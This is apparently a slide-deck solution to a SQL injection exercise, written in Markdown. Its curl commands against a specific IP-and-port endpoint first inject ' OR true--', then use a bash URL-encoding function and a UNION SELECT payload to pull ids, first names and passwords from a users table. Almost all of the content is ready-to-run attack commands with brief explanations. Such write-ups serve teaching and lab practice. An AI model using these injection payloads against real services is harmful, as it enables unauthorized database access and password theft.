---
author: "@Babidiii"
date: "January 02, 2006"
paging: Slide[ %d / %d ]
---
# Soluce Feuille 

# Test 

```bash
curl -s -S "165.227.225.62:3333/team/Dion" | jq
echo "--------"
curl -s -S "165.227.225.62:3333/team/albert" | jq
```
---

# Soluce
- Trying some escape with dummy `' OR true`

```bash
curl -s -S "165.227.225.62:3333/team/' OR true--" 2>&1 | jq '.[:3]'
```

---
# Trying with url encoding

`' OR true--` --> **urlencoding** --> `'%20OR%20true--`
* `'` escape the string
* `OR true` return yes for each row in the where clause
* `--` comment the end of the request 

```bash
curl -s -S "165.227.225.62:3333/team/'%20OR%20true--" | jq '.[:3]'
```

---

# Exploit
- Using scripts for URL encoding

```bash
# URL Encoder 
urle () { 
  [[ "${1}" ]] || return 1; 
  local LANG=C i x; for (( i = 0; i < ${#1}; i++ )); do 
    x="${1:i:1}"; [[ "${x}" == [a-zA-Z0-9.~_-] ]] && echo -n "${x}" || printf '%%%02X' "'${x}"; 
  done; echo; 
}

# Building malicious payload
pld="' UNION SELECT id,firstname,password,null,null from users--" 
enc_pld="$(urle "${pld}")"

# debug
echo "PAYLOAD --> ${pld}"
echo "ENCODED --> ${enc_pld}"

# Sending malicious payload
echo "Sending payload"
curl -s -S "165.227.225.62:3333/team/${enc_pld}" | jq 
```
